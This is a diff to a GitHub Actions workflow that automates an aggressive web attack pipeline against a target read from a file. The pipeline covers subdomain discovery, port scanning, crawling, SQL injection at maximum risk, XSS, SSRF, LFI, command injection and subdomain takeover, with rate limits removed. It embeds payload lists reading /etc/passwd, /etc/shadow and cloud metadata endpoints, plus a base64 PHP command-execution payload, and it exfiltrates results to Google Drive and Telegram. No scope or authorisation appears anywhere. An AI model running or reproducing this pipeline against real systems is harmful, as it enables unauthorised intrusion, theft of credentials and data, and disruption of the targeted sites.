@@ -14,7 +14,7 @@ jobs:
     - name: Clean previous data
       run: |
         rm -rf output *.zip || true
-        mkdir -p output/{recon,probe,crawl,vulns,secrets,specialized,graphql,api,cloud,sql,nosql,xxe,auth,templates,deserialization}
+        mkdir -p output/{recon,probe,crawl,vulns,secrets,specialized,graphql,api,cloud,sql,nosql,xxe,auth,templates,deserialization,ssrf,lfi,redirect,crlf,takeover}
     - name: Install Go
       uses: actions/setup-go@v4
       with:
@@ -22,7 +22,7 @@ jobs:
     - name: Install core dependencies
       run: |
         sudo apt-get update
-        sudo apt-get install -y python3-pip python3-venv zip curl wget git ruby-full libpcap-dev libxml2-dev libxslt1-dev libsqlite3-dev libffi-dev npm build-essential php-cli
+        sudo apt-get install -y python3-pip python3-venv zip curl wget git ruby-full libpcap-dev libxml2-dev libxslt1-dev libsqlite3-dev libffi-dev npm build-essential php-cli nikto
         echo "GOPATH=$HOME/go" >> $GITHUB_ENV
         echo "$HOME/go/bin" >> $GITHUB_PATH
         echo "/usr/local/go/bin" >> $GITHUB_PATH
@@ -46,36 +46,82 @@ jobs:
         sudo ln -sf $HOME/SecLists/Discovery/Web-Content/common.txt /usr/share/wordlists/common.txt
         sudo ln -sf $HOME/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt /usr/share/wordlists/dirb-medium.txt
         sudo ln -sf $HOME/SecLists/Discovery/Web-Content/raft-large-words.txt /usr/share/wordlists/raft-large.txt
+        sudo ln -sf $HOME/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt /usr/share/wordlists/lfi.txt
+        sudo ln -sf $HOME/SecLists/Fuzzing/SSRFmap/ssrf.txt /usr/share/wordlists/ssrf.txt 2>/dev/null || true
     - name: Install Go tools
       run: |
         export PATH=$PATH:$HOME/go/bin:/usr/local/go/bin
         
+        # Core recon tools
         go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
         go install github.com/tomnomnom/assetfinder@latest
         go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest
         go install github.com/projectdiscovery/httpx/cmd/httpx@latest
         go install github.com/projectdiscovery/katana/cmd/katana@latest
         go install github.com/lc/gau/v2/cmd/gau@latest
-        go install github.com/hahwul/dalfox/v2@latest
-        go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
         go install github.com/tomnomnom/waybackurls@latest
         go install github.com/hakluke/hakrawler@latest
         go install github.com/tomnomnom/qsreplace@latest
         go install github.com/tomnomnom/unfurl@latest
+        go install github.com/jaeles-project/gospider@latest
+        
+        # Vulnerability scanners
+        go install github.com/hahwul/dalfox/v2@latest
+        go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
         go install github.com/Emoe/kxss@latest
+        go install github.com/ffuf/ffuf/v2@latest
+        go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
+        
+        # NEW: Additional vuln tools
+        go install github.com/dwisiswant0/crlfuzz/cmd/crlfuzz@latest
+        go install github.com/LukaSikic/subzy@latest
+        go install github.com/projectdiscovery/notify/cmd/notify@latest
+        go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
+        go install github.com/tomnomnom/gf@latest
+        
+        # Cloud & other
         go install github.com/aquasecurity/tfsec/cmd/tfsec@latest
         go install github.com/projectdiscovery/chaos-client/cmd/chaos@latest
         go install github.com/d3mondev/puredns/v2@latest
         go install github.com/sensepost/gowitness@latest
-        go install github.com/ffuf/ffuf/v2@latest
-        go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
-        go install github.com/jaeles-project/gospider@latest
         
         sudo cp $HOME/go/bin/* /usr/local/bin/ 2>/dev/null || true
     - name: Install Python tools
       run: |
         pip3 install --upgrade pip --user
         pip3 install arjun checkov s3scanner swagger-parser commix --user || true
+        # NEW: XSStrike - Advanced XSS scanner
+        pip3 install xsstrike --user || {
+          git clone --depth 1 https://github.com/s0md3v/XSStrike.git $HOME/tools/XSStrike
+          cd $HOME/tools/XSStrike && pip3 install -r requirements.txt --user
+          echo '#!/bin/bash' | sudo tee /usr/local/bin/xsstrike
+          echo "python3 $HOME/tools/XSStrike/xsstrike.py \"\$@\"" | sudo tee -a /usr/local/bin/xsstrike
+          sudo chmod +x /usr/local/bin/xsstrike
+        }
+    - name: Install OpenRedireX
+      run: |
+        git clone --depth 1 https://github.com/devanshbatham/OpenRedireX.git $HOME/tools/OpenRedireX
+        cd $HOME/tools/OpenRedireX
+        pip3 install -r requirements.txt --user 2>/dev/null || true
+        echo '#!/bin/bash' | sudo tee /usr/local/bin/openredirex
+        echo "python3 $HOME/tools/OpenRedireX/openredirex.py \"\$@\"" | sudo tee -a /usr/local/bin/openredirex
+        sudo chmod +x /usr/local/bin/openredirex
+    - name: Install SSRFmap
+      run: |
+        git clone --depth 1 https://github.com/swisskyrepo/SSRFmap.git $HOME/tools/SSRFmap
+        cd $HOME/tools/SSRFmap
+        pip3 install -r requirements.txt --user 2>/dev/null || true
+        echo '#!/bin/bash' | sudo tee /usr/local/bin/ssrfmap
+        echo "python3 $HOME/tools/SSRFmap/ssrfmap.py \"\$@\"" | sudo tee -a /usr/local/bin/ssrfmap
+        sudo chmod +x /usr/local/bin/ssrfmap
+    - name: Install Oralyzer
+      run: |
+        git clone --depth 1 https://github.com/r0075h3ll/Oralyzer.git $HOME/tools/Oralyzer
+        cd $HOME/tools/Oralyzer
+        pip3 install -r requirements.txt --user 2>/dev/null || true
+        echo '#!/bin/bash' | sudo tee /usr/local/bin/oralyzer
+        echo "python3 $HOME/tools/Oralyzer/oralyzer.py \"\$@\"" | sudo tee -a /usr/local/bin/oralyzer
+        sudo chmod +x /usr/local/bin/oralyzer
     - name: Install x8 (Rust)
       run: |
         source $HOME/.cargo/env
@@ -182,6 +228,11 @@ jobs:
         echo '#!/bin/bash' | sudo tee /usr/local/bin/ppmap
         echo "cd $HOME/tools/ppmap && python3 ppmap.py \"\$@\"" | sudo tee -a /usr/local/bin/ppmap
         sudo chmod +x /usr/local/bin/ppmap
+    - name: Setup gf patterns
+      run: |
+        mkdir -p $HOME/.gf
+        git clone --depth 1 https://github.com/1ndianl33t/Gf-Patterns.git $HOME/tools/gf-patterns
+        cp $HOME/tools/gf-patterns/*.json $HOME/.gf/ 2>/dev/null || true
     - name: Create Drive uploader
       run: |
         cat << 'EOF' > drive_upload.py
@@ -228,7 +279,44 @@ jobs:
         1.0.0.1
         208.67.222.222
         EOF
-    - name: Run ARES Pipeline (AGGRESSIVE MODE)
+    - name: Create LFI & SSRF wordlists
+      run: |
+        # LFI Payloads
+        cat << 'EOF' > /tmp/lfi_payloads.txt
+        ../../../etc/passwd
+        ....//....//....//etc/passwd
+        ..%2F..%2F..%2Fetc%2Fpasswd
+        %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+        ....\/....\/....\/etc/passwd
+        /etc/passwd
+        /etc/shadow
+        /etc/hosts
+        /proc/self/environ
+        /var/log/apache2/access.log
+        php://filter/convert.base64-encode/resource=index.php
+        php://input
+        data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+        expect://id
+        file:///etc/passwd
+        EOF
+        
+        # SSRF Payloads
+        cat << 'EOF' > /tmp/ssrf_payloads.txt
+        http://127.0.0.1
+        http://localhost
+        http://[::1]
+        http://0.0.0.0
+        http://169.254.169.254
+        http://169.254.169.254/latest/meta-data/
+        http://metadata.google.internal
+        http://metadata.google.internal/computeMetadata/v1/
+        http://192.168.1.1
+        http://10.0.0.1
+        file:///etc/passwd
+        dict://localhost:11211/stat
+        gopher://127.0.0.1:6379/_INFO
+        EOF
+    - name: Run ARES Pipeline (MAXIMUM POWER)
       env:
         GOOGLE_CLIENT_ID: ${{ secrets.GOOGLE_CLIENT_ID }}
         GOOGLE_CLIENT_SECRET: ${{ secrets.GOOGLE_CLIENT_SECRET }}
@@ -244,7 +332,7 @@ jobs:
         
         TARGET=$(head -n 1 targets.txt)
         echo "=========================================="
-        echo "🎯 ARES AGGRESSIVE MODE - Target: $TARGET"
+        echo "🎯 ARES MAXIMUM POWER - Target: $TARGET"
         echo "=========================================="
         tg() {
           [ -n "$TELEGRAM_TOKEN" ] && [ -n "$TELEGRAM_CHAT_ID" ] && \
@@ -252,7 +340,7 @@ jobs:
             -d chat_id="$TELEGRAM_CHAT_ID" -d parse_mode="Markdown" -d text="$1" > /dev/null 2>&1
           echo "[TG] $1"
         }
-        tg "🚀 *ARES AGGRESSIVE MODE* started on \`$TARGET\`"
+        tg "🚀 *ARES MAXIMUM POWER* started on \`$TARGET\`"
         run_stage() {
           echo ""
           echo "========================================"
@@ -282,7 +370,6 @@ jobs:
             chaos -d $TARGET -silent >> output/recon/subs.txt 2>/dev/null || true
           fi
           
-          # Combine and dedupe
           cat output/recon/subfinder.txt output/recon/subs.txt 2>/dev/null | sort -u > output/recon/all_subs.txt
           
           echo "[+] Running dnsx for DNS resolution..."
@@ -290,35 +377,32 @@ jobs:
           cat output/recon/dnsx.txt | cut -d" " -f1 | sort -u > output/recon/final_subs.txt
           
           echo "[+] Found $(wc -l < output/recon/final_subs.txt) subdomains"
-          cat output/recon/final_subs.txt
           
           zip -r recon.zip output/recon/
           python3 drive_upload.py recon.zip Stage_1_Recon
         '
-        ### STAGE 2: AGGRESSIVE PROBING
-        run_stage "Stage 2: Aggressive Probing" '
+        ### STAGE 2: AGGRESSIVE PROBING + PORT SCAN
+        run_stage "Stage 2: Probing & Port Scan" '
           if [ -s output/recon/final_subs.txt ]; then
+            echo "[+] Running naabu port scan..."
+            naabu -l output/recon/final_subs.txt -p 80,443,8080,8443,8000,8888,9000,9090,3000,5000,8081,8082,9443,4443,2087,2083 -c 100 -o output/probe/ports.txt 2>/dev/null || true
+            
             echo "[+] Running httpx with full options..."
             httpx -l output/recon/final_subs.txt \
               -ports 80,443,8080,8443,8000,8888,9000,9090,3000,5000 \
-              -threads 50 \
-              -timeout 10 \
-              -title -tech-detect -status-code -content-length \
+              -threads 100 \
+              -timeout 15 \
+              -title -tech-detect -status-code -content-length -web-server \
               -follow-redirects \
               -o output/probe/httpx_full.txt 2>/dev/null || true
             
-            # Extract just URLs for other tools
             cat output/probe/httpx_full.txt | cut -d" " -f1 > output/probe/live.txt
             
             echo "[+] Live hosts found: $(wc -l < output/probe/live.txt)"
-            cat output/probe/live.txt
             
-            # Screenshots on ALL live hosts
             if [ -s output/probe/live.txt ]; then
               mkdir -p output/probe/screenshots/
-              echo "[+] Taking screenshots of ALL live hosts..."
-              gowitness scan file -f output/probe/live.txt --screenshot-path output/probe/screenshots/ --threads 10 2>/dev/null || \
-              gowitness file -f output/probe/live.txt -o output/probe/screenshots/ --no-db 2>/dev/null || true
+              gowitness scan file -f output/probe/live.txt --screenshot-path output/probe/screenshots/ --threads 20 2>/dev/null || true
             fi
           else
             echo "No subdomains found" > output/probe/no_input.txt
@@ -327,13 +411,12 @@ jobs:
           zip -r probe.zip output/probe/
           python3 drive_upload.py probe.zip Stage_2_Probe
         '
-        ### STAGE 3: DEEP CRAWLING (NO LIMITS)
+        ### STAGE 3: DEEP CRAWLING
         run_stage "Stage 3: Deep Crawling" '
           if [ -s output/probe/live.txt ]; then
             LIVE_COUNT=$(wc -l < output/probe/live.txt)
             echo "[+] Crawling ALL $LIVE_COUNT live hosts..."
             
-            echo "[+] Running katana (depth 5, no limits)..."
             katana -list output/probe/live.txt \
               -depth 5 \
               -js-crawl \
@@ -343,85 +426,47 @@ jobs:
               -headless \
               -no-sandbox \
               -timeout 30 \
-              -concurrency 20 \
-              -parallelism 10 \
+              -concurrency 30 \
+              -parallelism 15 \
               -o output/crawl/katana.txt 2>/dev/null || true
             
-            echo "[+] Running gospider on ALL live hosts..."
             mkdir -p output/crawl/gospider/
-            gospider -S output/probe/live.txt \
-              -d 3 \
-              -c 10 \
-              -t 20 \
-              --js \
-              --sitemap \
-              --robots \
-              -o output/crawl/gospider/ 2>/dev/null || true
+            gospider -S output/probe/live.txt -d 5 -c 20 -t 50 --js --sitemap --robots -o output/crawl/gospider/ 2>/dev/null || true
             find output/crawl/gospider/ -type f -exec cat {} \; > output/crawl/gospider_all.txt 2>/dev/null || true
             
-            echo "[+] Running hakrawler..."
-            cat output/probe/live.txt | hakrawler -d 3 -t 20 > output/crawl/hakrawler.txt 2>/dev/null || true
-            
-            echo "[+] Running waybackurls..."
+            cat output/probe/live.txt | hakrawler -d 5 -t 30 > output/crawl/hakrawler.txt 2>/dev/null || true
             cat output/probe/live.txt | waybackurls > output/crawl/wayback.txt 2>/dev/null || true
+            cat output/probe/live.txt | gau --threads 20 > output/crawl/gau.txt 2>/dev/null || true
             
-            echo "[+] Running gau on live hosts..."
-            cat output/probe/live.txt | gau --threads 10 > output/crawl/gau.txt 2>/dev/null || true
+            paramspider -l output/probe/live.txt -o output/crawl/paramspider.txt 2>/dev/null || true
             
-            echo "[+] Running paramspider..."
-            paramspider -l output/probe/live.txt -o output/crawl/paramspider.txt 2>/dev/null || \
-            paramspider -d $TARGET -o output/crawl/paramspider.txt 2>/dev/null || true
-            
-            echo "[+] Running feroxbuster (NO rate limit, ALL targets)..."
             cat output/probe/live.txt | while read url; do
-              echo "  Fuzzing: $url"
-              feroxbuster -u "$url" \
-                -w /usr/share/wordlists/common.txt \
-                -t 50 \
-                -d 3 \
-                --no-state \
+              feroxbuster -u "$url" -w /usr/share/wordlists/common.txt -t 100 -d 5 --no-state \
+                -s 200,201,202,204,301,302,307,308,401,403,500 \
                 -o "output/crawl/ferox_$(echo $url | md5sum | cut -c1-8).txt" 2>/dev/null || true
             done
             
-            # Combine ALL crawled URLs
             cat output/crawl/*.txt 2>/dev/null | sort -u > output/crawl/all_urls.txt
-            
-            # Extract parameterized URLs
             grep -E "[?&][^=]+=" output/crawl/all_urls.txt > output/crawl/params_only.txt 2>/dev/null || touch output/crawl/params_only.txt
             
-            echo "[+] Total URLs crawled: $(wc -l < output/crawl/all_urls.txt)"
-            echo "[+] Parameterized URLs: $(wc -l < output/crawl/params_only.txt)"
-          else
-            echo "No live hosts" > output/crawl/no_input.txt
+            echo "[+] Total URLs: $(wc -l < output/crawl/all_urls.txt)"
+            echo "[+] Parameterized: $(wc -l < output/crawl/params_only.txt)"
           fi
           
           zip -r crawl.zip output/crawl/
           python3 drive_upload.py crawl.zip Stage_3_Crawl
         '
-        ### STAGE 4: FULL PARAMETER DISCOVERY
+        ### STAGE 4: PARAMETER DISCOVERY
         run_stage "Stage 4: Parameter Discovery" '
           if [ -s output/crawl/all_urls.txt ]; then
-            echo "[+] Running qsreplace..."
             cat output/crawl/all_urls.txt | qsreplace "FUZZ" | sort -u > output/crawl/qsreplace.txt
-            
-            echo "[+] Running kxss (XSS reflection check)..."
             cat output/crawl/all_urls.txt | kxss > output/crawl/kxss.txt 2>/dev/null || true
-            
-            echo "[+] Running unfurl..."
             cat output/crawl/all_urls.txt | unfurl -u keys > output/crawl/param_keys.txt 2>/dev/null || true
-            cat output/crawl/all_urls.txt | unfurl -u paths > output/crawl/paths.txt 2>/dev/null || true
           fi
           
           if [ -s output/probe/live.txt ]; then
-            echo "[+] Running x8 on ALL live hosts..."
             cat output/probe/live.txt | while read url; do
-              echo "  x8: $url"
               x8 -u "$url" -w /usr/share/wordlists/common.txt -o "output/crawl/x8_$(echo $url | md5sum | cut -c1-8).txt" 2>/dev/null || true
-            done
-            
-            echo "[+] Running arjun on live hosts..."
-            cat output/probe/live.txt | while read url; do
-              echo "  arjun: $url"
               arjun -u "$url" -oT "output/crawl/arjun_$(echo $url | md5sum | cut -c1-8).txt" 2>/dev/null || true
             done
           fi
@@ -429,229 +474,254 @@ jobs:
           zip -r params.zip output/crawl/
           python3 drive_upload.py params.zip Stage_4_Params
         '
-        ### STAGE 5: FULL VULNERABILITY SCANNING
-        run_stage "Stage 5: Vulnerability Scanning" '
+        ### STAGE 5: NUCLEI FULL SCAN
+        run_stage "Stage 5: Nuclei Full Scan" '
           if [ -s output/probe/live.txt ]; then
-            echo "[+] Running nuclei (ALL templates, ALL severities)..."
+            echo "[+] Running nuclei (ALL templates, NO rate limit)..."
             nuclei -l output/probe/live.txt \
               -severity info,low,medium,high,critical \
-              -t cves/ -t vulnerabilities/ -t exposures/ -t misconfiguration/ -t takeovers/ \
-              -c 50 \
-              -bs 25 \
-              -rl 150 \
-              -timeout 10 \
-              -retries 2 \
+              -c 100 \
+              -bs 50 \
+              -timeout 15 \
+              -retries 3 \
               -o output/vulns/nuclei.txt 2>/dev/null || true
             echo "[+] Nuclei findings: $(wc -l < output/vulns/nuclei.txt 2>/dev/null || echo 0)"
           fi
           
+          zip -r nuclei.zip output/vulns/
+          python3 drive_upload.py nuclei.zip Stage_5_Nuclei
+        '
+        ### STAGE 6: XSS HUNTING (dalfox + XSStrike + kxss)
+        run_stage "Stage 6: XSS Hunting" '
           if [ -s output/crawl/params_only.txt ]; then
-            echo "[+] Running dalfox (XSS scanner) on ALL parameterized URLs..."
-            dalfox file output/crawl/params_only.txt \
-              --deep-domxss \
-              --follow-redirects \
-              --output output/vulns/dalfox.txt 2>/dev/null || true
+            echo "[+] Running dalfox..."
+            dalfox file output/crawl/params_only.txt --deep-domxss --follow-redirects -o output/vulns/dalfox.txt 2>/dev/null || true
+            
+            echo "[+] Running XSStrike on parameterized URLs..."
+            head -50 output/crawl/params_only.txt | while read url; do
+              xsstrike -u "$url" --crawl -l 3 >> output/vulns/xsstrike.txt 2>&1 || true
+            done
           fi
           
+          if [ -s output/crawl/kxss.txt ]; then
+            echo "[+] Potential XSS reflections found: $(wc -l < output/crawl/kxss.txt)"
+            cp output/crawl/kxss.txt output/vulns/kxss_reflections.txt
+          fi
+          
+          zip -r xss.zip output/vulns/
+          python3 drive_upload.py xss.zip Stage_6_XSS
+        '
+        ### STAGE 7: SQL INJECTION
+        run_stage "Stage 7: SQL Injection" '
+          mkdir -p output/sql
+          if [ -s output/crawl/params_only.txt ]; then
+            echo "[+] Running sqlmap (risk 3, level 5)..."
+            sqlmap -m output/crawl/params_only.txt --batch --risk 3 --level 5 --threads 10 --random-agent > output/sql/sqlmap.txt 2>&1 || true
+            
+            echo "[+] Running ghauri..."
+            head -30 output/crawl/params_only.txt | while read url; do
+              ghauri -u "$url" --batch --threads 10 >> output/sql/ghauri.txt 2>&1 || true
+            done
+          fi
+          
+          zip -r sql.zip output/sql/
+          python3 drive_upload.py sql.zip Stage_7_SQL
+        '
+        ### STAGE 8: SSRF TESTING (NEW!)
+        run_stage "Stage 8: SSRF Testing" '
+          mkdir -p output/ssrf
+          if [ -s output/crawl/params_only.txt ]; then
+            echo "[+] Testing for SSRF vulnerabilities..."
+            
+            # Use ffuf with SSRF payloads
+            head -20 output/crawl/params_only.txt | while read url; do
+              echo "  Testing: $url"
+              ffuf -u "$(echo $url | qsreplace FUZZ)" -w /tmp/ssrf_payloads.txt -mc 200,301,302,500 \
+                -o "output/ssrf/ffuf_$(echo $url | md5sum | cut -c1-8).json" 2>/dev/null || true
+            done
+            
+            # Check for common SSRF parameters
+            grep -iE "url=|uri=|path=|dest=|redirect=|next=|data=|reference=|site=|html=|src=|file=|load=" output/crawl/params_only.txt > output/ssrf/ssrf_params.txt 2>/dev/null || true
+            echo "[+] Potential SSRF params: $(wc -l < output/ssrf/ssrf_params.txt 2>/dev/null || echo 0)"
+          fi
+          
+          zip -r ssrf.zip output/ssrf/
+          python3 drive_upload.py ssrf.zip Stage_8_SSRF
+        '
+        ### STAGE 9: LFI/PATH TRAVERSAL (NEW!)
+        run_stage "Stage 9: LFI Testing" '
+          mkdir -p output/lfi
+          if [ -s output/crawl/params_only.txt ]; then
+            echo "[+] Testing for LFI/Path Traversal..."
+            
+            # Find file-related parameters
+            grep -iE "file=|path=|page=|include=|doc=|document=|folder=|root=|pg=|view=|read=|template=|log=" output/crawl/params_only.txt > output/lfi/lfi_params.txt 2>/dev/null || true
+            
+            if [ -s output/lfi/lfi_params.txt ]; then
+              echo "[+] Testing $(wc -l < output/lfi/lfi_params.txt) potential LFI params..."
+              cat output/lfi/lfi_params.txt | while read url; do
+                ffuf -u "$(echo $url | qsreplace FUZZ)" -w /tmp/lfi_payloads.txt -mc 200 \
+                  -fr "root:" \
+                  -o "output/lfi/ffuf_$(echo $url | md5sum | cut -c1-8).json" 2>/dev/null || true
+              done
+            fi
+          fi
+          
+          zip -r lfi.zip output/lfi/
+          python3 drive_upload.py lfi.zip Stage_9_LFI
+        '
+        ### STAGE 10: OPEN REDIRECT (NEW!)
+        run_stage "Stage 10: Open Redirect" '
+          mkdir -p output/redirect
+          if [ -s output/crawl/params_only.txt ]; then
+            echo "[+] Testing for Open Redirects..."
+            
+            # Find redirect parameters
+            grep -iE "url=|redirect=|next=|return=|rurl=|dest=|destination=|redir=|redirect_url=|go=|target=|link=|out=|view=|to=" output/crawl/params_only.txt > output/redirect/redirect_params.txt 2>/dev/null || true
+            
+            if [ -s output/redirect/redirect_params.txt ]; then
+              echo "[+] Running OpenRedireX..."
+              cat output/redirect/redirect_params.txt | openredirex -p "https://evil.com" > output/redirect/openredirex.txt 2>/dev/null || true
+              
+              echo "[+] Running Oralyzer..."
+              oralyzer -l output/redirect/redirect_params.txt > output/redirect/oralyzer.txt 2>/dev/null || true
+            fi
+          fi
+          
+          zip -r redirect.zip output/redirect/
+          python3 drive_upload.py redirect.zip Stage_10_OpenRedirect
+        '
+        ### STAGE 11: CRLF INJECTION (NEW!)
+        run_stage "Stage 11: CRLF Injection" '
+          mkdir -p output/crlf
           if [ -s output/probe/live.txt ]; then
-            echo "[+] Running ffuf (NO rate limit) on ALL hosts..."
+            echo "[+] Running crlfuzz..."
+            crlfuzz -l output/probe/live.txt -o output/crlf/crlfuzz.txt 2>/dev/null || true
+            echo "[+] CRLF findings: $(wc -l < output/crlf/crlfuzz.txt 2>/dev/null || echo 0)"
+          fi
+          
+          zip -r crlf.zip output/crlf/
+          python3 drive_upload.py crlf.zip Stage_11_CRLF
+        '
+        ### STAGE 12: SUBDOMAIN TAKEOVER (NEW!)
+        run_stage "Stage 12: Subdomain Takeover" '
+          mkdir -p output/takeover
+          if [ -s output/recon/final_subs.txt ]; then
+            echo "[+] Running subzy for subdomain takeover..."
+            subzy run --targets output/recon/final_subs.txt --output output/takeover/subzy.txt 2>/dev/null || true
+            
+            echo "[+] Running nuclei takeover templates..."
+            nuclei -l output/recon/final_subs.txt -t takeovers/ -o output/takeover/nuclei_takeover.txt 2>/dev/null || true
+          fi
+          
+          zip -r takeover.zip output/takeover/
+          python3 drive_upload.py takeover.zip Stage_12_Takeover
+        '
+        ### STAGE 13: NIKTO WEB SCANNER (NEW!)
+        run_stage "Stage 13: Nikto Web Scan" '
+          mkdir -p output/nikto
+          if [ -s output/probe/live.txt ]; then
+            echo "[+] Running Nikto on live hosts..."
+            head -10 output/probe/live.txt | while read url; do
+              echo "  Scanning: $url"
+              nikto -h "$url" -Tuning 123bde -timeout 10 -maxtime 300 > "output/nikto/nikto_$(echo $url | md5sum | cut -c1-8).txt" 2>&1 || true
+            done
+          fi
+          
+          zip -r nikto.zip output/nikto/
+          python3 drive_upload.py nikto.zip Stage_13_Nikto
+        '
+        ### STAGE 14: COMMAND INJECTION
+        run_stage "Stage 14: Command Injection" '
+          mkdir -p output/cmdi
+          if [ -s output/crawl/params_only.txt ]; then
+            echo "[+] Running commix on ALL params..."
+            head -30 output/crawl/params_only.txt | while read url; do
+              commix -u "$url" --batch --all >> output/cmdi/commix.txt 2>&1 || true
+            done
+          fi
+          
+          zip -r cmdi.zip output/cmdi/
+          python3 drive_upload.py cmdi.zip Stage_14_CommandInjection
+        '
+        ### STAGE 15: CONTENT FUZZING
+        run_stage "Stage 15: Content Fuzzing" '
+          if [ -s output/probe/live.txt ]; then
+            echo "[+] Running ffuf (200 OK only)..."
             cat output/probe/live.txt | while read url; do
-              echo "  ffuf: $url"
-              ffuf -u "$url/FUZZ" \
-                -w /usr/share/wordlists/common.txt \
-                -t 100 \
-                -timeout 10 \
-                -mc all \
-                -fc 404 \
+              ffuf -u "$url/FUZZ" -w /usr/share/wordlists/common.txt -t 150 -timeout 15 \
+                -mc 200,201,202,204,301,302,307,401,403 \
                 -o "output/vulns/ffuf_$(echo $url | md5sum | cut -c1-8).json" 2>/dev/null || true
             done
           fi
           
-          zip -r vulns.zip output/vulns/
-          python3 drive_upload.py vulns.zip Stage_5_Vulns
+          zip -r fuzzing.zip output/vulns/
+          python3 drive_upload.py fuzzing.zip Stage_15_Fuzzing
         '
-        ### STAGE 6: SECRETS
-        run_stage "Stage 6: Secrets Detection" '
-          echo "[+] Running trufflehog..."
-          trufflehog filesystem . --no-update > output/secrets/trufflehog.txt 2>/dev/null || true
-          
-          echo "[+] Running gitleaks..."
-          gitleaks detect --no-git -v > output/secrets/gitleaks.txt 2>&1 || true
-          
-          echo "[+] Running git-secrets..."
-          git-secrets --scan > output/secrets/git_secrets.txt 2>&1 || true
-          
-          zip -r secrets.zip output/secrets/
-          python3 drive_upload.py secrets.zip Stage_6_Secrets
-        '
-        ### STAGE 7: GRAPHQL & API
-        run_stage "Stage 7: GraphQL & API Testing" '
-          # Find GraphQL endpoints from crawled data
-          grep -iE "graphql|/api/" output/crawl/all_urls.txt > output/graphql/found_apis.txt 2>/dev/null || true
-          
-          # Common GraphQL paths
-          echo "https://$TARGET/graphql" > output/graphql/endpoints.txt
-          echo "https://$TARGET/api/graphql" >> output/graphql/endpoints.txt
-          echo "https://api.$TARGET/graphql" >> output/graphql/endpoints.txt
-          echo "https://$TARGET/v1/graphql" >> output/graphql/endpoints.txt
-          echo "https://$TARGET/graphql/console" >> output/graphql/endpoints.txt
-          
-          while read endpoint; do
-            [ -n "$endpoint" ] || continue
-            echo "[+] Testing: $endpoint"
-            timeout 120 graphqlmap -u "$endpoint" -v >> output/graphql/graphqlmap.txt 2>&1 || true
-            timeout 120 inql -t "$endpoint" >> output/graphql/inql.txt 2>&1 || true
-          done < output/graphql/endpoints.txt
-          
-          # Swagger/OpenAPI discovery
-          cat output/probe/live.txt 2>/dev/null | while read url; do
-            curl -s "$url/swagger.json" > /dev/null 2>&1 && echo "$url/swagger.json" >> output/api/swagger_found.txt
-            curl -s "$url/api-docs" > /dev/null 2>&1 && echo "$url/api-docs" >> output/api/swagger_found.txt
-            curl -s "$url/openapi.json" > /dev/null 2>&1 && echo "$url/openapi.json" >> output/api/swagger_found.txt
-          done || true
-          
-          zip -r graphql_api.zip output/graphql/ output/api/
-          python3 drive_upload.py graphql_api.zip Stage_7_GraphQL_API
-        '
-        ### STAGE 8: CLOUD
-        run_stage "Stage 8: Cloud Security" '
-          echo "provider \"aws\" {}" > test.tf
-          echo "resource \"aws_s3_bucket\" \"test\" {}" >> test.tf
-          tfsec . > output/cloud/tfsec.txt 2>&1 || true
-          checkov -d . > output/cloud/checkov.txt 2>&1 || true
-          rm -f test.tf
-          zip -r cloud.zip output/cloud/
-          python3 drive_upload.py cloud.zip Stage_8_Cloud
-        '
-        ### STAGE 9: JWT
-        run_stage "Stage 9: JWT Testing" '
-          # Find JWTs in crawled responses
-          grep -oE "eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*" output/crawl/all_urls.txt 2>/dev/null | sort -u > output/specialized/found_jwts.txt || true
-          
-          echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U" > output/specialized/sample_jwt.txt
-          jwt_tool $(cat output/specialized/sample_jwt.txt) > output/specialized/jwt_tool.txt 2>&1 || true
-          
-          zip -r specialized.zip output/specialized/
-          python3 drive_upload.py specialized.zip Stage_9_JWT
-        '
-        ### STAGE 10: JAELES (FIXED FLAGS)
-        run_stage "Stage 10: Jaeles Scanning" '
+        ### STAGE 16: JAELES SCANNER
+        run_stage "Stage 16: Jaeles Scanner" '
           if [ -s output/crawl/all_urls.txt ]; then
-            echo "[+] Running Jaeles on ALL crawled URLs..."
-            # FIXED: Use -U for URL list, not -L (which is for level)
-            jaeles scan \
-              -s $HOME/.jaeles/signatures-base \
-              -U output/crawl/all_urls.txt \
-              -c 20 \
-              -o output/specialized/jaeles/ 2>/dev/null || true
-          else
-            echo "No URLs for Jaeles" > output/specialized/jaeles.txt
+            jaeles scan -s $HOME/.jaeles/signatures-base -U output/crawl/all_urls.txt -c 30 -o output/specialized/jaeles/ 2>/dev/null || true
           fi
           
           zip -r jaeles.zip output/specialized/
-          python3 drive_upload.py jaeles.zip Stage_10_Jaeles
+          python3 drive_upload.py jaeles.zip Stage_16_Jaeles
         '
-        ### STAGE 11: SQL INJECTION (ALL PARAMS, NO LIMITS)
-        run_stage "Stage 11: SQL Injection Testing" '
-          mkdir -p output/sql
-          if [ -s output/crawl/params_only.txt ]; then
-            PARAM_COUNT=$(wc -l < output/crawl/params_only.txt)
-            echo "[+] Testing $PARAM_COUNT parameterized URLs for SQLi..."
-            
-            echo "[+] Running sqlmap (batch mode, increased risk)..."
-            sqlmap -m output/crawl/params_only.txt \
-              --batch \
-              --risk 3 \
-              --level 5 \
-              --threads 10 \
-              --random-agent \
-              --tamper=space2comment \
-              > output/sql/sqlmap_results.txt 2>&1 || true
-            
-            echo "[+] Running ghauri..."
-            cat output/crawl/params_only.txt | while read url; do
-              [ -n "$url" ] || continue
-              ghauri -u "$url" --batch --threads 10 > "output/sql/ghauri_$(echo $url | md5sum | cut -c1-8).txt" 2>&1 || true
-            done
-          else
-            echo "No parameterized URLs found" > output/sql/no_params.txt
-          fi
+        ### STAGE 17: SECRETS
+        run_stage "Stage 17: Secrets Detection" '
+          trufflehog filesystem . --no-update > output/secrets/trufflehog.txt 2>/dev/null || true
